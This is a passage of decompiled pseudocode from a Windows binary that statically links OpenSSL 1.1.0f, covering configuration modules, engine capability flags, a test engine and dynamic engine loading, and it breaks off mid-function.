_QWORD *__fastcall sub_14002F380(__int64 a1, _BYTE *a2, const char *a3)
{
  int v4; // esi
  _BYTE *v5; // rdi
  _QWORD *v6; // rax
  void *v7; // rbx
  __int64 v8; // r14
  __int64 v9; // rax
  _QWORD *result; // rax

  v4 = 0;
  v5 = (_BYTE *)sub_14005C010(a1, a3, "path");
  if ( !v5 )
  {
    sub_140023B90();
    v5 = a2;
  }
  v6 = sub_140035410(0i64, v5, 0i64, 0);
  v7 = v6;
  if ( v6 )
  {
    v8 = sub_140035050((__int64)v6, (__int64)"OPENSSL_init");
    if ( v8 )
    {
      v9 = sub_140035050((__int64)v7, (__int64)"OPENSSL_finish");
      result = sub_14002F010((__int64)v7, a2, v8, v9);
      if ( result )
        return result;
    }
    else
    {
      v4 = 112;
    }
  }
  else
  {
    v4 = 110;
  }
  sub_1400352F0(v7);
  sub_140024610(14, 117, v4, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\conf\\conf_mod.c", 220);
  sub_140023A40(4, "module=", a2, ", path=", v5);
  return 0i64;
}
// 140024610: using guessed type __int64 __fastcall sub_140024610(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);

//----- (000000014002F490) ----------------------------------------------------
__int64 __fastcall sub_14002F490(__int64 a1, char *a2, char *a3, char a4)
{
  __int64 v8; // rax
  int v10; // esi
  char v11[16]; // [rsp+40h] [rbp-38h] BYREF

  v8 = sub_14002F110(a2);
  if ( v8 || (a4 & 8) == 0 && (v8 = (__int64)sub_14002F380(a1, a2, a3)) != 0 )
  {
    v10 = sub_14002F1E0(v8, a2, a3, a1);
    if ( v10 <= 0 && (a4 & 4) == 0 )
    {
      sub_140024610(14, 118, 109, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\conf\\conf_mod.c", 173);
      sub_14002A5C0(v11, 0xDui64, "%-8d", (unsigned int)v10);
      sub_140023A40(6, "module=", a2, ", value=", a3, ", retcode=", v11);
    }
    return (unsigned int)v10;
  }
  else
  {
    if ( (a4 & 4) == 0 )
    {
      sub_140024610(14, 118, 113, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\conf\\conf_mod.c", 162);
      sub_140023A40(2, "module=", a2);
    }
    return 0xFFFFFFFFi64;
  }
}
// 140024610: using guessed type __int64 __fastcall sub_140024610(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);

//----- (000000014002F5D0) ----------------------------------------------------
__int64 sub_14002F5D0()
{
  __int64 result; // rax

  result = sub_14001E0C0(256, 0i64);
  if ( (_DWORD)result )
  {
    result = sub_140025B80(&dword_140142BC8);
    if ( result )
    {
      if ( *(_QWORD *)(result + 16) )
        ++*(_DWORD *)(result + 24);
    }
  }
  return result;
}
// 140142BC8: using guessed type _DWORD dword_140142BC8;

//----- (000000014002F610) ----------------------------------------------------
void sub_14002F610()
{
  int **v0; // rax

  v0 = (int **)sub_140025B80(&dword_140142BCC);
  sub_14002F740(v0);
}
// 140142BCC: using guessed type _DWORD dword_140142BCC;

//----- (000000014002F640) ----------------------------------------------------
__int64 sub_14002F640()
{
  __int64 result; // rax
  int v1; // ecx

  result = sub_14001E0C0(256, 0i64);
  if ( (_DWORD)result )
  {
    result = sub_140025B80(&dword_140142BC8);
    if ( result )
    {
      if ( *(_QWORD *)(result + 16) )
      {
        v1 = *(_DWORD *)(result + 24);
        if ( v1 )
          *(_DWORD *)(result + 24) = v1 - 1;
      }
    }
  }
  return result;
}
// 140142BC8: using guessed type _DWORD dword_140142BC8;

//----- (000000014002F690) ----------------------------------------------------
__int64 sub_14002F690()
{
  sub_140025B60(&dword_140142BC8);
  return sub_140025B60(&dword_140142BCC);
}
// 140142BC8: using guessed type _DWORD dword_140142BC8;
// 140142BCC: using guessed type _DWORD dword_140142BCC;

//----- (000000014002F6C0) ----------------------------------------------------
void __fastcall sub_14002F6C0(int **a1)
{
  __int64 v2; // rax
  LPVOID *v3; // rbx

  if ( a1 && *a1 )
  {
    while ( 1 )
    {
      v2 = sub_1400296F0(*a1);
      v3 = (LPVOID *)v2;
      if ( !v2 )
        break;
      sub_14001D930(*(void **)(v2 + 24));
      DeleteFiber(*v3);
      sub_14001D930(v3);
    }
  }
}

//----- (000000014002F740) ----------------------------------------------------
void __fastcall sub_14002F740(int **a1)
{
  void *v2; // rbx

  if ( a1 )
  {
    sub_14002F6C0(a1);
    sub_1400294B0((void **)*a1);
    sub_14001D930(a1);
    sub_140025CC0(&dword_140142BCC, 0i64);
    sub_14005C170();
    if ( (unsigned int)sub_14001E0C0(256i64, 0i64) )
      v2 = (void *)sub_140025B80(&dword_140142BC8);
    else
      v2 = 0i64;
    if ( (unsigned int)sub_140025CC0(&dword_140142BC8, 0i64) )
      sub_14001D930(v2);
  }
}
// 14001E0C0: using guessed type __int64 __fastcall sub_14001E0C0(_QWORD, _QWORD);
// 140142BC8: using guessed type _DWORD dword_140142BC8;
// 140142BCC: using guessed type _DWORD dword_140142BCC;

//----- (000000014002F7E0) ----------------------------------------------------
__int64 sub_14002F7E0()
{
  if ( (unsigned int)sub_14001E0C0(256i64, 0i64) )
    return sub_140025B80(&dword_140142BC8);
  else
    return 0i64;
}
// 14001E0C0: using guessed type __int64 __fastcall sub_14001E0C0(_QWORD, _QWORD);
// 140142BC8: using guessed type _DWORD dword_140142BC8;

//----- (000000014002F820) ----------------------------------------------------
__int64 sub_14002F820()
{
  if ( !(unsigned int)sub_140025BA0(&dword_140142BC8) )
    return 0i64;
  if ( !(unsigned int)sub_140025BA0(&dword_140142BCC) )
  {
    sub_140025B60(&dword_140142BC8);
    return 0i64;
  }
  return 1i64;
}
// 140142BC8: using guessed type _DWORD dword_140142BC8;
// 140142BCC: using guessed type _DWORD dword_140142BCC;

//----- (000000014002F870) ----------------------------------------------------
__int64 sub_14002F870()
{
  __int64 i; // rbx

  for ( i = sub_1400411A0(); i; i = sub_140041240(i) )
  {
    if ( (*(_BYTE *)(i + 152) & 8) == 0 )
    {
      sub_140025780(i);
      sub_14005C230(i);
      sub_14004F6B0(i);
      sub_1400509E0(i);
      sub_14004FCA0(i);
      sub_140046D40(i);
      sub_140040CF0(i);
      sub_14003C190(i);
    }
  }
  return 1i64;
}

//----- (000000014002F900) ----------------------------------------------------
_BOOL8 __fastcall sub_14002F900(__int64 a1, __int16 a2)
{
  return ((a2 & 0x40) == 0 || (unsigned int)sub_140025800(a1))
      && ((a2 & 0x80u) == 0 || (unsigned int)sub_14005C2A0(a1))
      && ((a2 & 1) == 0 || (unsigned int)sub_14004F700(a1))
      && ((a2 & 2) == 0 || (unsigned int)sub_140050A30(a1))
      && ((a2 & 4) == 0 || (unsigned int)sub_14004FCF0(a1))
      && ((a2 & 0x800) == 0 || (unsigned int)sub_140046DA0(a1))
      && ((a2 & 8) == 0 || (unsigned int)sub_140040D50(a1))
      && ((a2 & 0x200) == 0 || (unsigned int)sub_14003C200(a1))
      && ((a2 & 0x400) == 0 || (unsigned int)sub_14004DA90(a1));
}

//----- (000000014002F9E0) ----------------------------------------------------
_BOOL8 __fastcall sub_14002F9E0(__int64 a1, const char *a2)
{
  int v5; // [rsp+50h] [rbp+18h] BYREF

  v5 = 0;
  if ( (unsigned int)sub_14002EEA0(
                       a2,
                       44,
                       1,
                       (__int64 (__fastcall *)(const char *, __int64, __int64))sub_14002FA80,
                       (__int64)&v5) )
    return sub_14002F900(a1, v5);
  sub_140024610(38, 189, 150, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\engine\\eng_fat.c", 91);
  sub_140023A40(2, "str=", a2);
  return 0i64;
}
// 140024610: using guessed type __int64 __fastcall sub_140024610(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);

//----- (000000014002FA80) ----------------------------------------------------
__int64 __fastcall sub_14002FA80(const char *a1, int a2, _DWORD *a3)
{
  size_t v6; // rsi

  if ( !a1 )
    return 0i64;
  v6 = a2;
  if ( !strncmp(a1, "ALL", a2) )
  {
    *a3 |= 0xFFFFu;
    return 1i64;
  }
  else if ( !strncmp(a1, "RSA", v6) )
  {
    *a3 |= 1u;
    return 1i64;
  }
  else if ( !strncmp(a1, "DSA", v6) )
  {
    *a3 |= 2u;
    return 1i64;
  }
  else if ( !strncmp(a1, "DH", v6) )
  {
    *a3 |= 4u;
    return 1i64;
  }
  else if ( !strncmp(a1, "EC", v6) )
  {
    *a3 |= 0x800u;
    return 1i64;
  }
  else if ( !strncmp(a1, "RAND", v6) )
  {
    *a3 |= 8u;
    return 1i64;
  }
  else if ( !strncmp(a1, "CIPHERS", v6) )
  {
    *a3 |= 0x40u;
    return 1i64;
  }
  else if ( !strncmp(a1, "DIGESTS", v6) )
  {
    *a3 |= 0x80u;
    return 1i64;
  }
  else if ( !strncmp(a1, "PKEY", v6) )
  {
    *a3 |= 0x600u;
    return 1i64;
  }
  else if ( !strncmp(a1, "PKEY_CRYPTO", v6) )
  {
    *a3 |= 0x200u;
    return 1i64;
  }
  else if ( !strncmp(a1, "PKEY_ASN1", v6) )
  {
    *a3 |= 0x400u;
    return 1i64;
  }
  else
  {
    return 0i64;
  }
}

//----- (000000014002FCD0) ----------------------------------------------------
_BOOL8 __fastcall sub_14002FCD0(_QWORD *a1)
{
  char **v2; // rax
  char **v3; // rax
  char **v4; // rax
  char **v5; // rax
  __int64 (__fastcall **v6)(); // rax
  _BOOL8 result; // rax

  result = 0;
  if ( (unsigned int)sub_140034BB0(a1, (__int64)off_140135158[0]) )
  {
    if ( (unsigned int)sub_140034C10((__int64)a1, (__int64)off_140135160[0]) )
    {
      if ( (unsigned int)sub_140034B60((__int64)a1, (__int64)sub_14002FEB0) )
      {
        v2 = sub_14002D000();
        if ( (unsigned int)sub_140025390((__int64)a1, (__int64)v2) )
        {
          v3 = sub_14002DA10();
          if ( (unsigned int)sub_1400253C0((__int64)a1, (__int64)v3) )
          {
            v4 = sub_1400291D0();
            if ( (unsigned int)sub_140046D90((__int64)a1, (__int64)v4) )
            {
              v5 = sub_14002D400();
              if ( (unsigned int)sub_140025370((__int64)a1, (__int64)v5) )
              {
                v6 = sub_140040720();
                if ( (unsigned int)sub_140040D40((__int64)a1, (__int64)v6) )
                {
                  if ( (unsigned int)sub_1400257F0((__int64)a1, (__int64)sub_14002FE40)
                    && (unsigned int)sub_14005C310((__int64)a1, (__int64)sub_14002FF10)
                    && (unsigned int)sub_14005DAB0((__int64)a1, (__int64)sub_14002FF60) )
                  {
                    return 1;
                  }
                }
              }
            }
          }
        }
      }
    }
  }
  return result;
}
// 140135158: using guessed type char *off_140135158[4];
// 140135160: using guessed type char *off_140135160[3];

//----- (000000014002FDE0) ----------------------------------------------------
void sub_14002FDE0()
{
  _QWORD *v0; // rax
  _QWORD *v1; // rbx

  v0 = sub_140034A80();
  v1 = v0;
  if ( v0 )
  {
    if ( sub_14002FCD0(v0) )
    {
      sub_140040DC0(v1);
      sub_1400349C0((__int64)v1);
      sub_140023B90();
    }
    else
    {
      sub_1400349C0((__int64)v1);
    }
  }
}

//----- (000000014002FE40) ----------------------------------------------------
__int64 __fastcall sub_14002FE40(__int64 a1, __int64 *a2, _QWORD *a3, int a4)
{
  if ( !a2 )
    return sub_14002FFE0(a3);
  if ( a4 == 5 )
  {
    *a2 = sub_1400301D0();
    return 1i64;
  }
  else if ( a4 == 97 )
  {
    *a2 = sub_140030120();
    return 1i64;
  }
  else
  {
    *a2 = 0i64;
    return 0i64;
  }
}

//----- (000000014002FEB0) ----------------------------------------------------
__int64 sub_14002FEB0()
{
  __int64 result; // rax

  sub_1400252E0((void *)qword_140142BF8);
  qword_140142BF8 = 0i64;
  sub_14005C340((void *)qword_140142BD0);
  qword_140142BD0 = 0i64;
  sub_14005C340((void *)qword_140142BD8);
  result = 1i64;
  qword_140142BD8 = 0i64;
  return result;
}
// 140142BD0: using guessed type __int64 qword_140142BD0;
// 140142BD8: using guessed type __int64 qword_140142BD8;
// 140142BF8: using guessed type __int64 qword_140142BF8;

//----- (000000014002FF10) ----------------------------------------------------
__int64 __fastcall sub_14002FF10(__int64 a1, __int64 *a2, _QWORD *a3, int a4)
{
  if ( !a2 )
    return sub_140030090(a3);
  if ( a4 == 64 )
  {
    *a2 = sub_140030400();
    return 1i64;
  }
  else
  {
    *a2 = 0i64;
    return 0i64;
  }
}

//----- (000000014002FF60) ----------------------------------------------------
__int64 *__fastcall sub_14002FF60(__int64 a1, const char *a2)
{
  int v2; // eax
  FILE *v4; // rax
  __int64 *result; // rax
  __int64 v6; // rdi
  _DWORD *v7; // rbx

  v4 = _acrt_iob_func(v2 - 30);
  sub_140002640((__int64)v4, (__int64)"(TEST_ENG_OPENSSL_PKEY)Loading Private key %s\n", a2);
  result = sub_14003E440(a2, "r");
  v6 = (__int64)result;
  if ( result )
  {
    v7 = sub_14005DAD0((__int64)result, 0i64, 0i64, 0i64);
    sub_140029BA0(v6);
    return (__int64 *)v7;
  }
  return result;
}
// 14002FF73: variable 'v2' is possibly undefined

//----- (000000014002FFE0) ----------------------------------------------------
__int64 __fastcall sub_14002FFE0(_QWORD *a1)
{
  unsigned int *v2; // rax
  int v3; // eax
  int v4; // edx
  unsigned int *v5; // rax
  int v6; // eax
  int v7; // edx
  int v8; // edx
  __int64 result; // rax

  if ( dword_140142BF4 )
  {
    result = (unsigned int)dword_140142BF0;
    *a1 = dword_140142BE0;
  }
  else
  {
    v2 = (unsigned int *)sub_1400301D0();
    if ( v2 )
    {
      v3 = sub_14001D4F0(v2);
      v4 = dword_140142BF0;
      dword_140142BE0[dword_140142BF0] = v3;
      dword_140142BF0 = v4 + 1;
    }
    v5 = (unsigned int *)sub_140030120();
    if ( v5 )
    {
      v6 = sub_14001D4F0(v5);
      v7 = dword_140142BF0;
      dword_140142BE0[dword_140142BF0] = v6;
      v8 = v7 + 1;
      dword_140142BF0 = v8;
    }
    else
    {
      v8 = dword_140142BF0;
    }
    dword_140142BF4 = 1;
    dword_140142BE0[v8] = 0;
    result = (unsigned int)v8;
    *a1 = dword_140142BE0;
  }
  return result;
}
// 140142BE0: using guessed type _DWORD dword_140142BE0[4];
// 140142BF0: using guessed type int dword_140142BF0;
// 140142BF4: using guessed type int dword_140142BF4;

//----- (0000000140030090) ----------------------------------------------------
__int64 __fastcall sub_140030090(_QWORD *a1)
{
  unsigned int *v2; // rax
  int v3; // eax
  int v4; // edx
  int v5; // edx
  __int64 result; // rax

  if ( dword_140142C0C )
  {
    result = (unsigned int)dword_140142C08;
    *a1 = dword_140142C00;
  }
  else
  {
    v2 = (unsigned int *)sub_140030400();
    if ( v2 )
    {
      v3 = sub_14001D4F0(v2);
      v4 = dword_140142C08;
      dword_140142C00[dword_140142C08] = v3;
      v5 = v4 + 1;
      dword_140142C08 = v5;
    }
    else
    {
      v5 = dword_140142C08;
    }
    dword_140142C0C = 1;
    dword_140142C00[v5] = 0;
    result = (unsigned int)v5;
    *a1 = dword_140142C00;
  }
  return result;
}
// 140142C00: using guessed type _DWORD dword_140142C00[2];
// 140142C08: using guessed type int dword_140142C08;
// 140142C0C: using guessed type int dword_140142C0C;

//----- (0000000140030120) ----------------------------------------------------
__int64 sub_140030120()
{
  __int64 result; // rax
  _DWORD *v1; // rax
  void *v2; // rbx

  result = qword_140142BD8;
  if ( !qword_140142BD8 )
  {
    v1 = sub_14005C360(5, 1, 5);
    v2 = v1;
    if ( !v1
      || !(unsigned int)sub_140025380((__int64)v1, 0)
      || !(unsigned int)sub_14005C3B0((__int64)v2, 8)
      || !(unsigned int)sub_1400253C0((__int64)v2, (__int64)sub_1400302D0)
      || !(unsigned int)sub_140025370((__int64)v2, (__int64)sub_140030280)
      || !(unsigned int)sub_14005C3C0((__int64)v2, 1048) )
    {
      sub_14005C340(v2);
      v2 = 0i64;
    }
    qword_140142BD8 = (__int64)v2;
    return (__int64)v2;
  }
  return result;
}
// 140142BD8: using guessed type __int64 qword_140142BD8;

//----- (00000001400301D0) ----------------------------------------------------
__int64 sub_1400301D0()
{
  __int64 result; // rax
  _DWORD *v1; // rax
  void *v2; // rbx

  result = qword_140142BD0;
  if ( !qword_140142BD0 )
  {
    v1 = sub_14005C360(5, 1, 16);
    v2 = v1;
    if ( !v1
      || !(unsigned int)sub_140025380((__int64)v1, 0)
      || !(unsigned int)sub_14005C3B0((__int64)v2, 8)
      || !(unsigned int)sub_1400253C0((__int64)v2, (__int64)sub_1400302D0)
      || !(unsigned int)sub_140025370((__int64)v2, (__int64)sub_140030280)
      || !(unsigned int)sub_14005C3C0((__int64)v2, 1048) )
    {
      sub_14005C340(v2);
      v2 = 0i64;
    }
    qword_140142BD0 = (__int64)v2;
    return (__int64)v2;
  }
  return result;
}
// 140142BD0: using guessed type __int64 qword_140142BD0;

//----- (0000000140030280) ----------------------------------------------------
__int64 __fastcall sub_140030280(__int64 a1, _BYTE *a2, _BYTE *a3, unsigned __int64 a4)
{
  __int64 v7; // rax

  v7 = sub_140024D00(a1);
  sub_14005DEB0((_DWORD *)(v7 + 16), a4, a3, a2);
  return 1i64;
}

//----- (00000001400302D0) ----------------------------------------------------
__int64 __fastcall sub_1400302D0(__int64 a1, const void *a2)
{
  int v2; // eax
  FILE *v5; // rax
  size_t v6; // rbx
  void *v7; // rax
  __int64 v8; // rdi
  __int64 v9; // rax

  v5 = _acrt_iob_func(v2 - 30);
  sub_140002640((__int64)v5, (__int64)"(TEST_ENG_OPENSSL_RC4) test_init_key() called\n");
  v6 = (int)sub_140024D30(a1);
  v7 = (void *)sub_140024D00(a1);
  memmove(v7, a2, v6);
  v8 = sub_140024D00(a1);
  LODWORD(v6) = sub_140024D30(a1);
  v9 = sub_140024D00(a1);
  sub_14005DD50((_QWORD *)(v9 + 16), v6, v8);
  return 1i64;
}
// 1400302EE: variable 'v2' is possibly undefined

//----- (0000000140030370) ----------------------------------------------------
__int64 __fastcall sub_140030370(__int64 a1, _BYTE *a2)
{
  int *v3; // rax

  v3 = (int *)sub_14001C740(a1);
  return sub_14005C3D0(a2, v3);
}

//----- (00000001400303A0) ----------------------------------------------------
__int64 __fastcall sub_1400303A0(__int64 a1)
{
  _DWORD *v1; // rax

  v1 = (_DWORD *)sub_14001C740(a1);
  return sub_14005C560(v1);
}

//----- (00000001400303C0) ----------------------------------------------------
__int64 __fastcall sub_1400303C0(__int64 a1, unsigned int *a2, size_t a3)
{
  __int64 v5; // rax

  v5 = sub_14001C740(a1);
  return sub_14005C5B0(v5, a2, a3);
}

//----- (0000000140030400) ----------------------------------------------------
__int64 sub_140030400()
{
  __int64 result; // rax
  _DWORD *v1; // rax
  void *v2; // rbx

  result = qword_140142BF8;
  if ( !qword_140142BF8 )
  {
    v1 = sub_140025310(64, 65);
    v2 = v1;
    if ( !v1
      || !(unsigned int)sub_1400253B0((__int64)v1, 20)
      || !(unsigned int)sub_1400253A0((__int64)v2, 64)
      || !(unsigned int)sub_140025360((__int64)v2, 104)
      || !(unsigned int)sub_140025380((__int64)v2, 0)
      || !(unsigned int)sub_140025390((__int64)v2, (__int64)sub_1400303A0)
      || !(unsigned int)sub_1400253C0((__int64)v2, (__int64)sub_1400303C0)
      || !(unsigned int)sub_140025370((__int64)v2, (__int64)sub_140030370) )
    {
      sub_1400252E0(v2);
      v2 = 0i64;
    }
    qword_140142BF8 = (__int64)v2;
    return (__int64)v2;
  }
  return result;
}
// 140142BF8: using guessed type __int64 qword_140142BF8;

//----- (00000001400304D0) ----------------------------------------------------
__int64 __fastcall sub_1400304D0(__int64 a1, int a2, unsigned int a3, _BYTE *a4)
{
  __int64 v8; // rax
  __int64 v9; // rsi
  unsigned int v10; // ebx
  unsigned int v11; // eax
  _BYTE *i; // rcx
  void *v13; // rax
  unsigned int v15; // ebx
  unsigned int v16; // eax
  _BYTE *j; // rcx
  void *v18; // rax
  unsigned int v19; // ebx
  _BYTE *k; // rax
  void *v21; // rax
  void *v22; // rbx

  v8 = sub_140030850(a1);
  v9 = v8;
  if ( v8 )
  {
    if ( *(_QWORD *)v8 )
    {
      sub_140024610(38, 180, 100, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\engine\\eng_dyn.c", 301);
    }
    else
    {
      switch ( a2 )
      {
        case 200:
          v10 = 0;
          if ( a4 )
          {
            v11 = 0;
            for ( i = a4; *i; ++v11 )
            {
              if ( v11 >= 0x80000000 )
                break;
              ++i;
            }
            if ( (v11 & 0x7FFFFFFF) == 0 )
              a4 = 0i64;
          }
          sub_14001D930(*(void **)(v9 + 24));
          if ( a4 )
          {
            v13 = sub_14003BB60(a4);
            *(_QWORD *)(v9 + 24) = v13;
            LOBYTE(v10) = v13 != 0i64;
          }
          else
          {
            *(_QWORD *)(v9 + 24) = 0i64;
            LOBYTE(v10) = 0;
          }
          return v10;
        case 201:
          *(_DWORD *)(v8 + 32) = a3 != 0;
          return 1i64;
        case 202:
          v15 = 0;
          if ( a4 )
          {
            v16 = 0;
            for ( j = a4; *j; ++v16 )
            {
              if ( v16 >= 0x80000000 )
                break;
              ++j;
            }
            if ( (v16 & 0x7FFFFFFF) == 0 )
              a4 = 0i64;
          }
          sub_14001D930(*(void **)(v9 + 40));
          if ( a4 )
          {
            v18 = sub_14003BB60(a4);
            *(_QWORD *)(v9 + 40) = v18;
            LOBYTE(v15) = v18 != 0i64;
          }
          else
          {
            *(_QWORD *)(v9 + 40) = 0i64;
            LOBYTE(v15) = 0;
          }
          return v15;
        case 203:
          if ( a3 <= 2 )
          {
            *(_DWORD *)(v8 + 48) = a3;
            return 1i64;
          }
          sub_140024610(38, 180, 143, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\engine\\eng_dyn.c", 330);
          return 0i64;
        case 204:
          if ( a3 <= 2 )
          {
            *(_DWORD *)(v8 + 72) = a3;
            return 1i64;
          }
          sub_140024610(38, 180, 143, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\engine\\eng_dyn.c", 339);
          return 0i64;
        case 205:
          if ( !a4 )
            goto LABEL_44;
          v19 = 0;
          for ( k = a4; *k; ++v19 )
          {
            if ( v19 >= 0x80000000 )
              break;
            ++k;
          }
          if ( (v19 & 0x7FFFFFFF) != 0 )
          {
            v21 = sub_14003BB60(a4);
            v22 = v21;
            if ( v21 )
            {
              if ( (unsigned int)sub_1400297C0(*(int **)(v9 + 80), (__int64)v21) )
                return 1i64;
              sub_14001D930(v22);
              sub_140024610(38, 180, 65, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\engine\\eng_dyn.c", 358);
            }
            else
            {
              sub_140024610(38, 180, 65, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\engine\\eng_dyn.c", 353);
            }
          }
          else
          {
LABEL_44:
            sub_140024610(38, 180, 143, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\engine\\eng_dyn.c", 347);
          }
          break;
        case 206:
          return sub_140030930(a1, v8);
        default:
          sub_140024610(38, 180, 119, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\engine\\eng_dyn.c", 366);
          return 0i64;
      }
    }
  }
  else
  {
    sub_140024610(38, 180, 112, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\engine\\eng_dyn.c", 295);
  }
  return 0i64;
}
// 140024610: using guessed type __int64 __fastcall sub_140024610(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);

//----- (00000001400307D0) ----------------------------------------------------
void __fastcall sub_1400307D0(__int64 a1, void **a2)
{
  if ( a2 )
  {
    sub_1400352F0(*a2);
    sub_14001D930(a2[3]);
    sub_14001D930(a2[5]);
    sub_140029720(a2[10], (void (*)(void))sub_140030ED0);
    sub_14001D930(a2);
  }
}

//----- (0000000140030850) ----------------------------------------------------
__int64 __fastcall sub_140030850(__int64 a1)
{
  int v1; // edx
  int v3; // edi
  __int64 result; // rax
  int v5; // eax
  __int64 v6; // [rsp+48h] [rbp+10h] BYREF

  v1 = dword_140135178;
  if ( dword_140135178 < 0 )
  {
    v3 = sub_1400261E0(0xAu, 0, 0i64, 0i64, 0i64, (__int64)sub_1400307D0);
    if ( v3 == -1 )
    {
      sub_140024610(38, 181, 144, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\engine\\eng_dyn.c", 210);
      return 0i64;
    }
    sub_140025D20((_DWORD *)qword_140147E80);
    v5 = dword_140135178;
    if ( dword_140135178 < 0 )
      v5 = v3;
    dword_140135178 = v5;
    sub_140025CE0((_DWORD *)qword_140147E80);
    v1 = dword_140135178;
  }
  result = sub_140034A50(a1, v1);
  v6 = result;
  if ( !result )
  {
    if ( !(unsigned int)sub_140030C70(a1, &v6) )
      return 0i64;
    return v6;
  }
  return result;
}
// 140024610: using guessed type __int64 __fastcall sub_140024610(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 140135178: using guessed type int dword_140135178;
// 140147E80: using guessed type __int64 qword_140147E80;

//----- (0000000140030930) ----------------------------------------------------
__int64 __fastcall sub_140030930(__int64 a1, __int64 a2)
{
  void *v4; // rax
  __int64 result; // rax
  __int64 v6; // rax
  void *v7; // rcx
  unsigned int (__fastcall *v8)(__int64); // rax
  void *v9; // rcx
  __int128 v10; // xmm1
  __int128 v11; // xmm0
  __int128 v12; // xmm1
  __int128 v13; // xmm0
  __int128 v14; // xmm1
  __int128 v15; // xmm0
  __int128 v16; // xmm1
  __int128 v17; // xmm0
  __int128 v18; // xmm1
  __int128 v19; // xmm0
  void *v20; // rcx
  __int128 v21; // xmm1
  __int128 v22; // xmm0
  __int128 v23; // xmm1
  __int128 v24; // xmm0
  __int128 v25; // xmm1
  __int128 v26; // xmm0
  __int128 v27; // xmm1
  __int128 v28; // xmm0
  __int128 v29; // xmm1
  __int128 v30; // xmm0
  __int128 v31; // xmm1
  void *v32; // [rsp+30h] [rbp-E8h] BYREF
  __int64 v33; // [rsp+38h] [rbp-E0h] BYREF
  __int64 (__fastcall *v34)(); // [rsp+40h] [rbp-D8h] BYREF
  __int64 v35; // [rsp+48h] [rbp-D0h] BYREF
  __int128 v36; // [rsp+50h] [rbp-C8h]
  __int128 v37; // [rsp+60h] [rbp-B8h]
  __int128 v38; // [rsp+70h] [rbp-A8h]
  __int128 v39; // [rsp+80h] [rbp-98h]
  __int128 v40; // [rsp+90h] [rbp-88h]
  __int128 v41; // [rsp+A0h] [rbp-78h]
  __int128 v42; // [rsp+B0h] [rbp-68h]
  __int128 v43; // [rsp+C0h] [rbp-58h]
  __int128 v44; // [rsp+D0h] [rbp-48h]
  __int128 v45; // [rsp+E0h] [rbp-38h]
  __int128 v46; // [rsp+F0h] [rbp-28h]
  __int128 v47; // [rsp+100h] [rbp-18h]

  if ( !*(_QWORD *)a2 )
  {
    v4 = sub_1400355C0();
    *(_QWORD *)a2 = v4;
    if ( !v4 )
      return 0i64;
  }
  if ( !*(_QWORD *)(a2 + 24) )
  {
    if ( !*(_QWORD *)(a2 + 40) )
      return 0i64;
    sub_140035180(*(_DWORD **)a2, 2u, 2);
    *(_QWORD *)(a2 + 24) = sub_1400350D0(*(_QWORD *)a2, *(_BYTE **)(a2 + 40));
  }
  if ( !(unsigned int)sub_140030F00((__int64 *)a2) )
  {
    sub_140024610(38, 182, 132, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\engine\\eng_dyn.c", 414);
    sub_1400352F0(*(void **)a2);
    *(_QWORD *)a2 = 0i64;
    return 0i64;
  }
  v6 = sub_140035050(*(_QWORD *)a2, *(_QWORD *)(a2 + 64));
  *(_QWORD *)(a2 + 16) = v6;
  if ( !v6 )
  {
    v7 = *(void **)a2;
    *(_QWORD *)(a2 + 16) = 0i64;
    sub_1400352F0(v7);
    *(_QWORD *)a2 = 0i64;
    sub_140024610(38, 182, 104, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\engine\\eng_dyn.c", 427);
    return 0i64;
  }
  if ( !*(_DWORD *)(a2 + 32) )
  {
    v8 = (unsigned int (__fastcall *)(__int64))sub_140035050(*(_QWORD *)a2, *(_QWORD *)(a2 + 56));
    *(_QWORD *)(a2 + 8) = v8;
    if ( !v8 || v8(196608i64) < 0x30000 )
    {
      v9 = *(void **)a2;
      *(_QWORD *)(a2 + 16) = 0i64;
      *(_QWORD *)(a2 + 8) = 0i64;
      sub_1400352F0(v9);
      *(_QWORD *)a2 = 0i64;
      sub_140024610(38, 182, 145, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\engine\\eng_dyn.c", 454);
      return 0i64;
    }
  }
  v10 = *(_OWORD *)(a1 + 16);
  v36 = *(_OWORD *)a1;
  v11 = *(_OWORD *)(a1 + 32);
  v37 = v10;
  v12 = *(_OWORD *)(a1 + 48);
  v38 = v11;
  v13 = *(_OWORD *)(a1 + 64);
  v39 = v12;
  v14 = *(_OWORD *)(a1 + 80);
  v40 = v13;
  v15 = *(_OWORD *)(a1 + 96);
  v41 = v14;
  v16 = *(_OWORD *)(a1 + 128);
  v42 = v15;
  v43 = *(_OWORD *)(a1 + 112);
  v17 = *(_OWORD *)(a1 + 144);
  v44 = v16;
  v18 = *(_OWORD *)(a1 + 160);
  v45 = v17;
  v19 = *(_OWORD *)(a1 + 176);
  v46 = v18;
  v47 = v19;
  v32 = sub_140034A70();
  sub_14001DBF0(&v33, &v34, &v35);
  sub_140034EA0(a1);
  if ( !(*(unsigned int (__fastcall **)(__int64, _QWORD, void **))(a2 + 16))(a1, *(_QWORD *)(a2 + 40), &v32) )
  {
    v20 = *(void **)a2;
    *(_QWORD *)(a2 + 16) = 0i64;
    *(_QWORD *)(a2 + 8) = 0i64;
    sub_1400352F0(v20);
    *(_QWORD *)a2 = 0i64;
    sub_140024610(38, 182, 109, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\engine\\eng_dyn.c", 485);
    v21 = v37;
    *(_OWORD *)a1 = v36;
    v22 = v38;
    *(_OWORD *)(a1 + 16) = v21;
    v23 = v39;
    *(_OWORD *)(a1 + 32) = v22;
